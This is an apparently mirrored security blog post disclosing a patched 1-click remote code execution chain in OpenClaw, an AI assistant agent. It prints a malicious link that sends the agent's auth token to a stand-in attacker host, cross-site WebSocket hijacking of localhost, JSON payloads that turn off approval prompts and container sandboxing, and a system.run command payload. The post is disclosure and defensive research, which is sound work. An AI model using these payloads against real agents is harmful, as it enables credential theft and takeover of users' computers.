<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys">Original</a>
    <h1>1-Click RCE to steal your Moltbot data and keys</h1>
    
    <div id="readability-page-1" class="page"><div><h2>Hacking the Hottest Agent in Tech</h2><p>OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent &#34;god mode&#34; permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.</p><p>I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.</p><h2>How depthfirst Flagged the Vulnerability</h2><p>Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.</p><p>Our system maps the full flow of an application&#39;s lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap: </p><p><strong>1. Ingestion:</strong> <code>app-settings.ts</code> blindly accepts a <code>gatewayUrl</code> query parameter in the URL and persists it to storage. For example, <code>https://localhost?gatewayUrl=attacker.com</code> would save <code>attacker.com</code> as the new gateway url.</p><pre contenteditable="false"><code><span>const</span><span> gatewayUrlRaw = params.get(</span><span>&#34;gatewayUrl&#34;</span><span>);
</span>...
<span></span><span>if</span><span> (gatewayUrlRaw != </span><span>null</span><span>) {
</span><span>  </span><span>const</span><span> gatewayUrl = gatewayUrlRaw.trim();
</span><span>  </span><span>if</span><span> (gatewayUrl &amp;&amp; gatewayUrl !== host.settings.gatewayUrl) {
</span><span>    applySettings(host, { ...host.settings, gatewayUrl }); </span><span>// persisted via saveSettings -&gt; localStorage</span><span>
</span>  }
<!-- -->}
</code></pre><p><strong>2. Processing:</strong> <code>app-lifecycle.ts</code> triggers <code>connectGateway()</code> <em>immediately</em> after settings (such as the gateway url) are applied.</p><pre contenteditable="false"><code><span>handleConnected</span><span>(</span><span>host</span><span>)</span><span> {
</span>  ...
<span>  connectGateway(host); </span><span>// runs immediately on load after parsing URL params</span><span>
</span>  startNodesPolling(host);
<!-- -->  ...
<!-- -->}</code></pre><p>3. <strong>Protocol Execution:</strong> gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.</p><pre contenteditable="false"><code><span>const</span><span> params = { ... , authToken, </span><span>locale</span><span>: navigator.language };
</span><span></span><span>void</span><span> </span><span>this</span><span>.request&lt;GatewayHelloOk&gt;(</span><span>&#34;connect&#34;</span><span>, params);</span></code></pre><p>In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker. </p><p>Here’s a preview of the finding in the depthfirst UI:</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f8d4b908591cf3f915319_Screenshot%202026-01-31%20at%207.19.02%E2%80%AFPM.png" loading="lazy" alt=""/></p></figure><h2>1-Click RCE Exploit Kill Chain</h2><h3>Limited Direct Exploitation</h3><p>Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.</p><p>These are the exploit steps:</p><p>1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>.</p><p>2. The attacker listening to WebSocket connections on their server receives the <code>auth</code> token.</p><figure><p><img src="https://cdn.prod.website-files.com/691d9445275873e3d3fc4279/697f89d1a1c89e5e19f32bb6_Screeenshot_2.png" loading="lazy" alt=""/></p></figure><p>3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.</p><p>The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.</p><p>This is bad enough, but this direct exploitation method has 3 limitations:</p><ol role="list"><li>It does not work on locally-running OpenClaw instances.</li><li>It does not bypass any defensive sandboxing or safety guardrails.</li><li>It does not achieve arbitrary code execution.</li></ol><p><strong>Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.</strong></p><h3>Pivoting to Bypass <code>localhost</code> Network Restrictions</h3><p>Most users run OpenClaw on <code>localhost</code>. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw. </p><p>However, I found a bug to bypass this otherwise frustrating restriction. </p><p>Regularly, <code>attacker.com</code> can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.</p><p>While browsers apply SOP to http connections, they do <em>not</em> to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request&#39;s <code>origin</code> and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket <code>origin</code> header, accepting requests from <em>any</em> site.</p><p>This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits <code>attacker.com</code>, I can run JavaScript on the victim’s browser to open a connection to <code>ws://localhost:18789</code> . The browser acts as a pivot point between <code>attacker.com</code> and the victim’s otherwise inaccessible <code>localhost</code>.</p><h3>Escaping The Sandbox</h3><p>OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses <code>exec-approvals.json</code> to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.</p><p>However, these protections are managed via the API itself. Because the stolen token grants <code>operator.admin</code> and <code>operator.approvals</code> scopes, I don&#39;t need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.</p><ol role="list"><li><strong>Disabling User Confirmation:</strong> I send a exec.approvals.set request to set ask: &#34;off&#34;. Now the agent won&#39;t ask the user for permission to run dangerous commands.</li><li><strong>Escaping Containers:</strong> I send a config.patch request to set tools.exec.host to &#34;gateway&#34;. This forces the agent to run commands directly on the host machine, not inside a Docker container.</li></ol><pre contenteditable="false"><code><span>// Payload to disable user prompts</span><span>
</span>{
<span>  </span><span>&#34;method&#34;</span><span>: </span><span>&#34;exec.approvals.set&#34;</span><span>,
</span><span>  </span><span>&#34;params&#34;</span><span>: { </span><span>&#34;defaults&#34;</span><span>: { </span><span>&#34;security&#34;</span><span>: </span><span>&#34;full&#34;</span><span>, </span><span>&#34;ask&#34;</span><span>: </span><span>&#34;off&#34;</span><span> } }
</span>}</code></pre><h3>Complete 1-Click RCE Exploit Killchain</h3><p>Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.</p><ol role="list"><li>Victim visits attacker.com (in practice, an inconspicuous url)</li><li>Client-side JavaScript from <code>attacker.com</code> executes on the victim browser, opening a background window to <code>http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080</code>. This sends the auth token to <code>attacker.com:8080</code></li><li>Client-side JavaScript from <code>attacker.com</code> executing on the victim browser creates a WebSocket connection to <code>ws://localhost:18789</code> (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: </li></ol><p>Finally, to achieve arbitrary command execution, the attacker JavaScript executes a <code>node.invoke</code> request:</p><pre contenteditable="false"><code><span>{
</span><span>     </span><span>&#34;type&#34;</span><span>: </span><span>&#34;req&#34;</span><span>,
</span><span>     </span><span>&#34;id&#34;</span><span>: </span><span>&#34;4&#34;</span><span>,
</span><span>     </span><span>&#34;method&#34;</span><span>: </span><span>&#34;node.invoke&#34;</span><span>,
</span><span>     </span><span>&#34;params&#34;</span><span>: {
</span><span>          </span><span>&#34;nodeId&#34;</span><span>: </span><span>&#34;main&#34;</span><span>,
</span><span>          </span><span>&#34;command&#34;</span><span>: </span><span>&#34;system.run&#34;</span><span>,
</span><span>          </span><span>&#34;params&#34;</span><span>: {
</span><span>               </span><span>&#34;cmd&#34;</span><span>: </span><span>&#34;bash -c &#39;echo hacked &gt; /tmp/hacked&#39;&#34;</span><span>
</span>          },
<span>          </span><span>&#34;timeoutMs&#34;</span><span>: </span><span>60000</span><span>,
</span><span>          </span><span>&#34;idempotencyKey&#34;</span><span>: </span><span>&#34;rev1&#34;</span><span>
</span>     }
<!-- -->}</code></pre><h2>Disclosure &amp; Patch</h2><p>The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the <a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq">GitHub Advisory</a>. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior. </p><p>All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.</p><p>depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let&#39;s talk.</p></div></div>
  </body>
</html>
